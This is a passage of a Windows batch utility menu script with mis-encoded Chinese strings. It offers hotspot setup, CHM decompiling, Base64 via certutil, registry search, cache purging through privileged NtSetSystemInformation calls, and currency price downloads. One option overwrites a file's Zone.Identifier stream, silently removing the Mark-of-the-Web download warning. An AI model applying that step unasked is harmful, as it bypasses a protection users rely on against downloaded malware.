!hx!
!sel!
if "!shuru!" equ "1" (goto kqwifi)
if "!shuru!" equ "2" (goto gbwifi)
if "!shuru!" equ "3" (goto wlpz)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 47
:kqwifi
title ����Wifi�ȵ�!system!
cls
set wifissid=
set wifimiam=
set /p "wifissid=������Wifi����(SSID): "
set /p "wifimima=������Wifi����(����λ��:8��63λ): "
cls
net start sharedaccess 2>nul
netsh wlan stop hostednetwork
netsh wlan set hostednetwork mode=allow ssid="!wifissid!" key=!wifimima!
netsh wlan start hostednetwork
!hx!
echo;����޷��������ֶ���ȡIP��ַ(�������ϵͳ����ǽҲ���޷����ӳɹ�)
echo;Wifi����(SSID): !wifissid!
echo;Wifi����: !wifimima!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 47
:gbwifi
title �ر�Wifi�ȵ�!system!
cls
netsh wlan stop hostednetwork
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 47
:wlpz
title �鿴��������!system!
cls
ipconfig /all
netsh wlan show drivers
netsh wlan show interface
netsh interface Teredo show state
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 47
:48
setlocal
title ������chm�ļ�!system!
cls
set chmlj=
echo;�϶�Ҫ�������chm�ļ����˴���
set /p "chmlj=���������ļ�����������(e=����): "
if /i "!chmlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc chmlj
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	endlocal
	goto 48
)
for /f "delims=" %%a in ("!chmlj!") do (
	if /i "%%~xa" neq ".chm" (
		!hx!
		echo;����chm�ļ���
		call :out 2
		endlocal
		goto 48
	)
	set chmcglj=
	set "chmcglj=%%~na"
	copy /y "!chmlj!" %systemdrive%\windows\temp\tmp.chm
	hh -decompile %systemdrive%\windows\temp\chm %systemdrive%\windows\temp\tmp.chm
	md "!zmlj!\%%~na"
	xcopy /c /e /y %systemdrive%\windows\temp\chm "!zmlj!\%%~na"
	rd /s /q %systemdrive%\windows\temp\chm
	del /f /q %systemdrive%\windows\temp\tmp.chm
	)
cls
echo;������ɹ���
echo;�Ա��浽"!zmlj!\!chmcglj!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:49
title �ر�����Ӧ����!system!
cls
taskkill /f /fi "status eq not responding"
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:50
setlocal
title �ļ��Ƚ���!system!
cls
echo;�϶�Ҫ�Ƚϵ��ļ����˴���(�ȽϹ��������� "Ctrl+C" 2�οɽ����Ƚ�)
!hx!
set /p "wj1=��һ��Ҫ�Ƚϵ��ļ�: "
set /p "wj2=�ڶ���Ҫ�Ƚϵ��ļ�: "
call :lj wj1 wj1
call :lj wj2 wj2
!hx!
fc /b "!wj1!" "!wj2!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:51
setlocal
title ������д����а�!system!
set nz=
cls
set /p "nz=������Ҫд�뵽���а����������:"
mshta vbscript:clipboardData.SetData("text","!nz!")(window.close)
if "!errorlevel!" equ "0" (set nz=0) else (set nz=1)
!hx!
if "!nz!" equ "0" (echo;д��ɹ�) else (echo;д��ʧ��)
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:52
cls
start services.msc
goto memuv2
:53
setlocal
cls
title ��֪�����ռ�������!system!
set jsxq=00000000
set /p "jsxq=������������(����20150605): "
call :checkvar jsxq num jg
if "!jg!" equ "0" (
	set /p =��������ȷ�ĸ�ʽ!<nul
	call :out 2
	endlocal
	goto 53
)
call :strlen jsxq jg
if "!jg!" neq "8" (
	set /p =��������ȷ�ĸ�ʽ!<nul
	call :out 2
	endlocal
	goto 53
)
set "y=!jsxq:~0,4!"
if !y! lss 10 (set /a "y=0x!y!")
set "m=!jsxq:~4,2!"
if !m! lss 10 (set /a "m=0x!m!")
if "!m!" equ "1" (
	set m=13
	set /a "y-=1"
)
if "!m!" equ "2" (
	set m=14
	set /a "y-=1"
)
set "d=!jsxq:~6,2!"
if !d! lss 10 (set /a "d=0x!d!")
set /a "d+=1"
set /a "w=d+2*m+3*(m+1)/5+y+y/4-y/100+y/400"
set /a "w=w%%7"
set /a "rn1=y%%4"
set /a "rn2=y%%100"
set /a "rn3=y%%400"
set rn=ƽ��
if "!rn1!" equ "0" (
	if "!rn2!" neq "0" (set rn=����)
)
if "!rn2!" equ "0" (
	if "!rn3!" equ "0" (set rn=����)
)
if "!w!" equ "1" (set w=һ)
if "!w!" equ "2" (set w=��)
if "!w!" equ "3" (set w=��)
if "!w!" equ "4" (set w=��)
if "!w!" equ "5" (set w=��)
if "!w!" equ "6" (set w=��)
if "!w!" equ "0" (set w=��)
echo;
echo;!rn! !jsxq:~0,4!��!jsxq:~4,2!��!jsxq:~6,2!��������!w!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:54
setlocal
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
cls
title ��ѯϵͳ����״̬!system!
set "cho=1230"
echo;����ϵͳ: !system:~3! !bit!λ
if "!system:~11,2!" equ "XP" (echo;Windows XPϵͳ�޷�ʹ�ô˹��ܲ�ѯ)
!hx!
echo;[1]��ʾ�����Ϣ
echo;[2]��ʾ��ϸ�������Ϣ
echo;[3]��ʾ��ǰ���״̬�Ľ�ֹ����
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (start slmgr.vbs -dli&goto 54)
if "!shuru!" equ "2" (start slmgr.vbs -dlv&goto 54)
if "!shuru!" equ "3" (start slmgr.vbs -xpr&goto 54)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 54
:55
setlocal
cls
title ����ָ���ļ��Ŀ�ݷ�ʽ������!system!
set kjfs=
set /p "kjfs=���϶�Ŀ���ļ����˴���: "
if not defined kjfs (endlocal&goto 55)
call :lj kjfs kjfs
for /f "delims=" %%a in ("!kjfs!") do (set "kjfsmc=%%~na")
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(a.SpecialFolders(""Desktop"") & ""\!kjfsmc!.lnk""):b.TargetPath=""!kjfs!"":b.WorkingDirectory=""%~dp0"":b.Save:close")
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:56
cls
start msconfig.exe
goto memuv2
:57
setlocal
cls
title ����ͳ��!system!
set zstj=
set /p "zstj=����������:"
call :strlen zstj jg
echo;�ܼ�!jg!����(����������)
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:58
setlocal
cls
title ������������!system!
set swjj=
set cwjj=
set /p "swjj=����Ҫ���ӵ��ļ���·��: "
set /p "cwjj=���������ļ��е����·��: "
call :lj swjj swjj
call :lj cwjj cwjj
mklink /d !cwjj! !swjj!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:59
title �򿪹������̨!system!
cls
start mmc
goto memuv2
:60
setlocal
cls
title ���Streams�ļ�����!system!
set jcwjsd=
set /p "jcwjsd=�϶�Ŀ���ļ����˴���: "
call :ljjc jcwjsd
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	endlocal
	goto 60
)
echo>"!jcwjsd!:Zone.Identifier"
echo;�������
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:61
setlocal
title ������ɾ�����г���װ���!system!
set "cho=123450"
cls
!hx!
echo;[1]�г���װ���
echo;[2]ɾ������ϵͳ�еġ����װ���Ŀ¼��ע�������
echo;[3]�г�ָ��Ŀ¼����װ��ľ�����
echo;[4]�����̷�(������װ���)
echo;[5]ɾ���̷�(ɾ����װ���)
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 61.1)
if "!shuru!" equ "2" (goto 61.2)
if "!shuru!" equ "3" (goto 61.3)
if "!shuru!" equ "4" (goto 61.4)
if "!shuru!" equ "5" (goto 61.5)
if "!shuru!" equ "6" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 61
:61.1
title �г���װ���!system!
cls
for /f "skip=22" %%a in ('mountvol') do (echo;%%a)
!hx!
set /p =�����������<nul&pause>nul
setlocal
goto 61
:61.2
title ɾ������ϵͳ�е�,���װ���Ŀ¼��ע�������!system!
cls
mountvol /r
echo;�������
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 61
:61.3
title �г�ָ��Ŀ¼����װ��ľ�����!system!
cls
fsutil fsinfo drives
!hx!
set xszz=
set /p "xszz=��������Ҫ��ʾ���̷�: "
cls
echo;!xszz!:\&mountvol !xszz!: /l
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 61
:61.4
title �����̷�(������װ���)!system!
cls
set xx1=0
for /f "delims=" %%a in ('"mountvol|find "\\?\Volume""') do (
	set /a "xx1+=1"
	set "b!xx1!=%%a"
	echo;[!xx1!]%%a
)
echo;[0]�����ϼ��˵�
!hx!
set cjpf=
set /p "cjpf=ѡ��װ���: "
if "!cjpf!" equ "" (goto 61.4)
if "!cjpf!" equ "0" (endlocal&goto 61)
set xzpf=
set /p "xzpf=�����̷�: "
if "!xzpf!" equ "" (goto 61.4)
mountvol !xzpf!: !b%cjpf%!
echo;�������
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 61
:61.5
title ɾ���̷�(ɾ����װ���)!system!
cls
fsutil fsinfo drives
!hx!
set scpf=
set /p "scpf=��������Ҫɾ�����̷�: "
mountvol !scpf!: /d
echo;�������
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 61
:62
setlocal
title ע�������!system!
cls
set zcbss=
set /p "zcbss=������Ҫ����������: "
!hx!
echo;(1/5)��HKEY_CLASSES_ROOT������...
reg query hkcr /f !zcbss! /s
!hx!
echo;(2/5)��HKEY_CURRENT_USER������...
reg query hkcu /f !zcbss! /s
!hx!
echo;(3/5)��HKEY_LOCAL_MACHINE������...
reg query hklm /f !zcbss! /s
!hx!
echo;(4/5)��HKEY_USERS������...
reg query hku /f !zcbss! /s
!hx!
echo;(5/5)��HKEY_CURRENT_CONFIG������...
reg query hkcc /f !zcbss! /s
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:63
setlocal
title Base�����!system!
cls
if not exist %systemroot%\system32\certutil.exe (
	echo;û���ҵ�certutil.exe
	echo;���ܼ���Base�����
	!hx!
	set /p =����������ز˵�<nul&pause>nul
	endlocal
	goto memuv2
)
!hx!
echo;[1]Base64����
echo;[2]Base64����
echo;[0]���ز˵�
!hx!
set cho=120
if "!shuru!" equ "1" (goto 63-1)
if "!shuru!" equ "2" (goto 63-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 63
:63-1
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64����!system!
set basebm=
set /p "basebm=����Ҫ������ַ������ļ�·��: "
if "!basebm!" equ "" (goto 63-1)
if not exist "!basebm!" (
	echo;!basebm!>"%temp%\tmp"
	certutil -decode -f "%temp%\tmp" "%temp%\codetmp">nul
	goto 63-11
)
call :lj basebm basebm
dir /ad "!basebm!" >nul 2>nul&&echo;���ܽ����ļ���||goto 63-12
call :out 2
goto 63-1
:63-12
certutil -decode -f "!basebm!" "%temp%\codetmp">nul
:63-11
cls
!hx!
echo;��������: !basebm!
echo;��������:
if exist "%temp%\codetmp" (type "%temp%\codetmp") else (echo;����ʧ��)
echo;
!hx!
set bxz=
set /p "bxz=����y�������,�������뷵���ϼ��˵�: "
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=���뱣��·��:"
	!hx!
	copy /y /z "%temp%\codetmp" !basebc!
	if "!errorlevel!" neq "0" (echo;����ʧ��) else (echo;����ɹ�)
	!hx!
	set /p =����������ز˵�<nul&pause>nul
)
del /f /q "%temp%\tmp"
del /f /q "%temp%\codetmp"
endlocal
goto 63
:63-2
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64����!system!
set basebm=
set /p "basebm=����Ҫ������ַ������ļ�·��: "
if "!basebm!" equ "" (goto 63-2)
if not exist "!basebm!" (
	set /p =!basebm!<nul>"%temp%\tmp"
	certutil -encode -f "%temp%\tmp" "%temp%\codetmp">nul
	goto 63-21
)
call :lj basebm basebm
dir /ad "!basebm!" >nul 2>nul&&echo;���ܱ����ļ���||goto 63-22
call :out 2
goto 63-2
:63-22
certutil -encode -f "!basebm!" "%temp%\codetmp">nul
:63-21
cls 
!hx!
echo;��������: !basebm!
echo;��������:
for /f "delims=" %%a in (%temp%\codetmp) do (
	if "%%a" neq "-----BEGIN CERTIFICATE-----" (
		if "%%a" neq "-----END CERTIFICATE-----" (echo;%%a)
	)
)
!hx!
set bxz=
set /p "bxz=����y�������,�������뷵���ϼ��˵�: "
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=���뱣��·��: "
	!hx!
	copy /y /z "%temp%\codetmp" !basebc!
	if "!errorlevel!" neq "0" (echo;����ʧ��) else (echo;����ɹ�)
	!hx!
	set /p =����������ز˵�<nul&pause>nul
)
del /f /q "%temp%\tmp"
del /f /q "%temp%\codetmp"
endlocal
goto 63
:64
setlocal
title 8.3���ļ�������!system!
set "cho=120"
cls
!hx!
echo;[1]��ѯ8.3���ļ���״̬
echo;[2]��ֹ8.3���ļ�������
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 64-1)
if "!shuru!" equ "2" (goto 64-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 64
:64-1
cls
fsutil fsinfo drives
set query83=
set /p "query83=������Ҫ��ѯ���̷�: "
fsutil 8dot3name query !query83!:
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 64
:64-2
cls
fsutil 8dot3name set 1
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 64
:65
setlocal
title ����NTFSѹ��!system!
cls
set url=
set /p "url=������Ҫѹ�����ļ���: "
for /f "delims=" %%a in ("!url!") do (set "url=%%~fa")
dir /ad "!url!">nul 2>nul||(
	echo;·�� !url! ����һ���ļ���
	timeout /t 2 /nobreak>nul
	goto 65
)
if exist "%temp%\listfile.log" (del /f /q "%temp%\listfile.log")
if exist "%temp%\loadtime.log" (del /f /q "%temp%\loadtime.log")
if exist "%temp%\uncompact.log" (del /f /q "%temp%\uncompact.log")
title ��¼�ļ��б�...
for /f "delims=" %%a in ('"dir/a/s/b "!url!""') do (
	echo;"%%a" %%~za %%~xa
	call :listfile "%%a" %%~za %%~xa
)
title ������Ƭ...
defrag "!url!" /u /v
echo;��ջ���...
net stop sysmain>nul 2>nul
call :pwiex clearcache
title ��¼�ļ�ѹ��ǰ�Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (call :loadfile %%a)
title ѹ���ļ�...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (compact /c %%a)
title ������Ƭ...
defrag "!url!" /u /v
echo;��ջ���...
call :pwiex clearcache
title �Ƚ�ѹ��ǰ��Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\loadtime.log) do (call :ifloadfile %%a)
title ��ѹ���ʺ�ѹ�����ļ�...
for /f "tokens=*" %%a in (%temp%\uncompact.log) do (compact /u %%a)
title ����NTFSѹ��!system!
net start sysmain>nul 2>nul
del /f /q "%temp%\listfile.log";"%temp%\loadtime.log";"%temp%\uncompact.log"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:ifloadfile
set "file=%1"
set "loadtime=%2"
call :copyfile !file!
if !raw! geq !loadtime! (echo;!file!>>"%temp%\uncompact.log")
goto :eof
:loadfile
set "file=%1"
call :copyfile !file!
echo;!file! !raw!>>"%temp%\loadtime.log"
goto :eof
:copyfile
set "file=%1"
echo;!file!
set "kssj=!time!"
copy /z !file! nul
set "jssj=!time!"
call :sjc !kssj! !jssj! raw
echo;��ȡ��ʱ: !raw! ms
goto :eof
:listfile
set "urld=%1"
set "size=%2"
set "name=%3"
dir /ad !urld!>nul 2>nul&&goto :eof
if "!name!" equ ".zip" (goto :eof)
if "!name!" equ ".rar" (goto :eof)
if "!name!" equ ".7z" (goto :eof)
if "!name!" equ ".png" (goto :eof)
if "!name!" equ ".jpg" (goto :eof)
if "!name!" equ ".mp3" (goto :eof)
if "!name!" equ ".acc" (goto :eof)
if "!name!" equ ".m4a" (goto :eof)
if "!name!" equ ".flac" (goto :eof)
if "!name!" equ ".ape" (goto :eof)
if "!name!" equ ".mp4" (goto :eof)
if "!name!" equ ".avi" (goto :eof)
if "!name!" equ ".flv" (goto :eof)
if "!name!" equ ".f4v" (goto :eof)
if "!name!" equ ".mkv" (goto :eof)
if "!name!" equ ".3gp" (goto :eof)
if "!name!" equ ".cab" (goto :eof)
if "!name!" equ ".pdf" (goto :eof)
if !size! gtr 4096 (
	if !size! leq 104857600 (echo;!urld!>>"%temp%\listfile.log")
)
goto :eof
#clearcache#
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Warning ��You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator!��
    Break
}

$Source = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ClearStandbyList
{
    public class Program
    {
        const int SE_PRIVILEGE_ENABLED = 2;
        const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
        const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
        const int SystemFileCacheInformation = 0x0015;
        const int SystemMemoryListInformation = 0x0050;
        const int MemoryPurgeStandbyList = 4;

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtSetSystemInformation(int InfoClass, IntPtr Info, int Length);
        public static bool Is64BitMode()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8;
        }

        static void Main(string[] args)
        {
            ClearFileSystemCache(true);
        }

        public static void ClearFileSystemCache(bool ClearStandbyCache)
        {
            try
            {
                if (SetIncreasePrivilege(SE_INCREASE_QUOTA_NAME))
                {
                    uint num1;
                    int SystemInfoLength;
                    GCHandle gcHandle;
                    if (!Is64BitMode())
                    {
                        SYSTEM_CACHE_INFORMATION cacheInformation = new SYSTEM_CACHE_INFORMATION();
                        cacheInformation.MinimumWorkingSet = uint.MaxValue;
                        cacheInformation.MaximumWorkingSet = uint.MaxValue;
                        SystemInfoLength = Marshal.SizeOf(cacheInformation);
                        gcHandle = GCHandle.Alloc(cacheInformation, GCHandleType.Pinned);
                        num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                        gcHandle.Free();
                    }
                    else
                    {
                        SYSTEM_CACHE_INFORMATION_64_BIT information64Bit = new SYSTEM_CACHE_INFORMATION_64_BIT();
                        information64Bit.MinimumWorkingSet = -1L;
                        information64Bit.MaximumWorkingSet = -1L;
                        SystemInfoLength = Marshal.SizeOf(information64Bit);
                        gcHandle = GCHandle.Alloc(information64Bit, GCHandleType.Pinned);
                        num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                        gcHandle.Free();
                    }
                    if (num1 != 0)
                        throw new Exception("NtSetSystemInformation(SYSTEMCACHEINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
                }
                if (ClearStandbyCache && SetIncreasePrivilege(SE_PROFILE_SINGLE_PROCESS_NAME))
                {

                    int SystemInfoLength = Marshal.SizeOf(MemoryPurgeStandbyList);
                    GCHandle gcHandle = GCHandle.Alloc(MemoryPurgeStandbyList, GCHandleType.Pinned);
                    uint num2 = NtSetSystemInformation(SystemMemoryListInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                    gcHandle.Free();
                    if (num2 != 0)
                        throw new Exception("NtSetSystemInformation(SYSTEMMEMORYLISTINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.ToString());
            }
        }

        private static bool SetIncreasePrivilege(string privilegeName)
        {
            using (WindowsIdentity current = WindowsIdentity.GetCurrent(TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges))
            {
                TokPriv1Luid newst;
                newst.Count = 1;
                newst.Luid = 0L;
                newst.Attr = SE_PRIVILEGE_ENABLED;
                if (!LookupPrivilegeValue(null, privilegeName, ref newst.Luid))
                    throw new Exception("Error in LookupPrivilegeValue: ", new Win32Exception(Marshal.GetLastWin32Error()));
                int num = AdjustTokenPrivileges(current.Token, false, ref newst, 0, IntPtr.Zero, IntPtr.Zero) ? 1 : 0;
                if (num == 0)
                    throw new Exception("Error in AdjustTokenPrivileges: ", new Win32Exception(Marshal.GetLastWin32Error()));
                return num != 0;
            }
        }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SYSTEM_CACHE_INFORMATION
    {
        public uint CurrentSize;
        public uint PeakSize;
        public uint PageFaultCount;
        public uint MinimumWorkingSet;
        public uint MaximumWorkingSet;
        public uint Unused1;
        public uint Unused2;
        public uint Unused3;
        public uint Unused4;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SYSTEM_CACHE_INFORMATION_64_BIT
    {
        public long CurrentSize;
        public long PeakSize;
        public long PageFaultCount;
        public long MinimumWorkingSet;
        public long MaximumWorkingSet;
        public long Unused1;
        public long Unused2;
        public long Unused3;
        public long Unused4;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp 

[ClearStandbyList.Program]::ClearFileSystemCache($true)
#clearcache#
:66
setlocal
title �����ļ���ϣֵ!system!
cls
set url=
set /p "url=�����ļ�·��(e=���ز˵�): "
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc url
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	endlocal
	goto 66
)
cls
echo;�ļ�: 		"!url!"
for /f "delims=" %%a in ("!url!") do (
	if %%~za gtr 1024 (
		call :xdwjs %%~za b dw
		echo;�ļ���С: 	!dw! %%~za�ֽ�
	) else (
		echo;�ļ���С: 	%%~za�ֽ�
	)
)
call :hash %url% md5 hash
call :convertu !hash! hash
echo;
echo;MD5:	 %hash%
call :hash %url% sha1 hash
call :convertu !hash! hash
echo;SHA-1:	 %hash%
call :hash %url% sha256 hash
call :convertu !hash! hash
echo;SHA-256: %hash%
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:67
setlocal
cls
title ��ʾ���һ���!system!
set "mainurl=https://api.coincap.io/v2/assets/"
set "mainurl1=https://api.coincap.io/v2/rates/"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
echo;���ػ����ļ�(�ܹ�13���ļ�)...
if not exist "%temp%\down" (md "%temp%\down") 
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%\down"
	curl !proxy! !doh! -A "!ua!" -# -Z --compressed -C - --retry 2 --retry-delay 1 --connect-timeout 5 ^
	-o cny.json			%mainurl1%chinese-yuan-renminbi ^
	-o doge.json		%mainurl%dogecoin ^
	-o btc.json			%mainurl%bitcoin ^
	-o eth.json			%mainurl%ethereum ^
	-o au.json			%mainurl1%gold-ounce ^
	-o ag.json			%mainurl1%silver-ounce ^
	-o eur.json			%mainurl1%euro ^
	-o gbp.json			%mainurl1%british-pound-sterling ^
	-o jpy.json			%mainurl1%japanese-yen ^
	-o hkd.json			%mainurl1%hong-kong-dollar ^
	-o twd.json			%mainurl1%new-taiwan-dollar ^
	-o xmr.json			%mainurl%monero ^
	-o filecoin.json	%mainurl%filecoin
	popd
) else (
	bitsadmin /transfer ���ػ����ļ�... /priority FOREGROUND ^
	%mainurl1%chinese-yuan-renminbi		"%temp%\down\cny.json" ^
	%mainurl%dogecoin					"%temp%\down\doge.json" ^
	%mainurl%bitcoin					"%temp%\down\btc.json" ^
	%mainurl%ethereum					"%temp%\down\eth.json" ^
	%mainurl1%gold-ounce				"%temp%\down\au.json" ^
	%mainurl1%silver-ounce				"%temp%\down\ag.json" ^
	%mainurl1%euro						"%temp%\down\eur.json" ^
	%mainurl1%british-pound-sterling	"%temp%\down\gbp.json" ^
	%mainurl1%japanese-yen				"%temp%\down\jpy.json" ^
	%mainurl1%hong-kong-dollar			"%temp%\down\hkd.json" ^
	%mainurl1%new-taiwan-dollar			"%temp%\down\twd.json" ^
	%mainurl%monero						"%temp%\down\xmr.json" ^
	%mainurl%filecoin					"%temp%\down\filecoin.json"
)
cls
echo;��������ļ�...
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\cny.json") do (
	set "cnytousd=%%a"
	set "cnytousd=!cnytousd:"=!"
	if not defined cnytousd (set cnytousd=1)
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\doge.json") do (
	set "dogetousd=%%a"
	set "doge24h=%%b"
	set "dogetousd=!dogetousd:"=!"
	set "doge24h=!doge24h:"=!"
	if not defined dogetousd (
		set dogetousd=1
		set doge24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!doge24h!") do (
		set "doge24h1=%%a"
		set "doge24h2=%%b"
	)
	set "doge24h=!doge24h1!.!doge24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\btc.json") do (
	set "btctousd=%%a"
	set "btc24h=%%b"
	set "btctousd=!btctousd:"=!"
	set "btc24h=!btc24h:"=!"
	if not defined btctousd (
		set btctousd=1
		set btc24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!btc24h!") do (
		set "btc24h1=%%a"
		set "btc24h2=%%b"
	)
	set "btc24h=!btc24h1!.!btc24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\eth.json") do (
	set "ethtousd=%%a"
	set "eth24h=%%b"
	set "ethtousd=!ethtousd:"=!"
	set "eth24h=!eth24h:"=!"
	if not defined ethtousd (
		set ethtousd=1
		set eth24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!eth24h!") do (
		set "eth24h1=%%a"
		set "eth24h2=%%b"
	)
	set "eth24h=!eth24h1!.!eth24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\filecoin.json") do (
	set "filetousd=%%a"
	set "file24h=%%b"
	set "filetousd=!filetousd:"=!"
	set "file24h=!file24h:"=!"
	if not defined filetousd (
		set filetousd=1
		file24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!file24h!") do (
		set "file24h1=%%a"
		set "file24h2=%%b"
	)
	set "file24h=!file24h1!.!file24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\xmr.json") do (
	set "xmrtousd=%%a"
	set "xmr24h=%%b"
	set "xmrtousd=!xmrtousd:"=!"
	set "xmr24h=!xmr24h:"=!"
	if not defined xmrtousd (
		set xmrtousd=1
		set xmr24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!xmr24h!") do (
		set "xmr24h1=%%a"
		set "xmr24h2=%%b"
	)
	set "xmr24h=!xmr24h1!.!xmr24h2:~0,3!"
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\au.json") do (
	set "autousd=%%a"
	set "autousd=!autousd:"=!"
	if not defined autousd (set autousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\ag.json") do (
	set "agtousd=%%a"
	set "agtousd=!agtousd:"=!"
	if not defined agtousd (set agtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\eur.json") do (
	set "eurtousd=%%a"
	set "eurtousd=!eurtousd:"=!"
	if not defined eurtousd (set eurtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\gbp.json") do (
	set "gbptousd=%%a"
	set "gbptousd=!gbptousd:"=!"
	if not defined gbptousd (set gbptousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\jpy.json") do (
	set "jpytousd=%%a"
	set "jpytousd=!jpytousd:"=!"
	if not defined jpytousd (set jpytousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\hkd.json") do (
	set "hkdtousd=%%a"
	set "hkdtousd=!hkdtousd:"=!"
	if not defined hkdtousd (set hkdtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\twd.json") do (
	set "twdtousd=%%a"
	set "hkdtousd=!hkdtousd:"=!"
	if not defined twdtousd (set twdtousd=1)
)
rd /s /q "%temp%\down">nul
